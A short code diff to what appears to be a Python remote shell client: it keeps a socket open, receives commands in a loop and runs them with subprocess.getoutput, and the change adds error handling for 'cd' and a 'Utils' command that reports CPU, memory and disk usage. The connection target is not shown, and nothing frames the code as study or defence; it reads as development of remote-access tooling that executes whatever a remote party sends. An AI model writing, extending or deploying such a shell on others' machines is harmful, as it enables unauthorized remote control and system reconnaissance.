@@ -3,6 +3,7 @@ import json
 import subprocess
 import os
 import logging
+import psutil
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -28,8 +29,14 @@ def shell():
     while True:
         command = recv()
         if command.startswith("cd"):
-            os.chdir(command.split()[1])
-            output = f"changed to {os.getcwd()}"
+            try:
+                os.chdir(command.split()[1])
+                output = f"changed to {os.getcwd()}"
+            except:
+                output = "No such path exists...."
+        elif command == "Utils":
+            output = f"####CPUM#### {str(psutil.cpu_percent())}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}"
+
         else:
             output = subprocess.getoutput(command)
 
